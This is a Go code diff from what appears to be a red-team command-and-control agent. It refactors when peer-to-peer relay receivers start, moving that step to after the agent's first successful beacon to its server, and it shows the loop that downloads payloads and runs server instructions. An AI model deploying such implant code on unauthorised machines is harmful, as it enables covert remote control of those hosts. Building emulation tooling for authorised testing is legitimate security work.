@@ -24,6 +24,9 @@ import (
 	_ "../executors/shells"    // necessary to initialize all submodules
 )
 
+var useP2pReceivers = false
+var receiversActivated = false
+
 // Will download each individual payload listed, and will return the full file paths of each downloaded payload.
 func downloadPayloads(payloadListStr string, coms contact.Contact, profile map[string]interface{}) []string {
 	var droppedPayloads []string
@@ -40,6 +43,16 @@ func downloadPayloads(payloadListStr string, coms contact.Contact, profile map[s
 	return droppedPayloads
 }
 
+func activateP2pReceivers(profile map[string]interface{}, coms contact.Contact) {
+	for receiverName, p2pReceiver := range proxy.P2pReceiverChannels {
+		if p2pReceiver != nil {
+			go p2pReceiver.StartReceiver(profile, coms)
+		} else {
+			output.VerbosePrint(fmt.Sprintf("[-] P2P Receiver for %s not found. Skipping.", receiverName))
+		}
+	}
+}
+
 func runAgent(coms contact.Contact, profile map[string]interface{}) {
 	watchdog := 0
 	checkin := time.Now()
@@ -48,6 +61,13 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 		if len(beacon) != 0 {
 			profile["paw"] = beacon["paw"]
 			checkin = time.Now()
+
+			// We have established comms. Run p2p receivers if allowed.
+			if useP2pReceivers && !receiversActivated {
+				activateP2pReceivers(profile, coms)
+				output.VerbosePrint("[*] Started up P2P receivers.")
+				receiversActivated = true
+			}
 		}
 		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
 			cmds := reflect.ValueOf(beacon["instructions"])
@@ -123,22 +143,14 @@ func Core(server string, group string, delay int, executors []string, c2 map[str
 	output.VerbosePrint(fmt.Sprintf("privilege=%s", privilege))
 	output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
 	output.VerbosePrint(fmt.Sprintf("c2 channel=%s", c2["c2Name"]))
+	output.VerbosePrint(fmt.Sprintf("allow p2p receivers=%v", p2pReceiversOn))
+	useP2pReceivers = p2pReceiversOn
 
 	profile := buildProfile(server, group, executors, privilege, c2["c2Name"])
 	util.Sleep(float64(delay))
 	for {
 		coms := chooseCommunicationChannel(profile, c2)
 		if coms != nil {
-			if p2pReceiversOn {
-				// If any p2p receivers are available, start them.
-				for receiverName, p2pReceiver := range proxy.P2pReceiverChannels {
-					if p2pReceiver != nil {
-						go p2pReceiver.StartReceiver(profile, coms)
-					} else {
-						output.VerbosePrint(fmt.Sprintf("[-] P2P Receiver for %s not found. Skipping.", receiverName))
-					}
-				}
-			}
 			for {
 				runAgent(coms, profile)
 			}
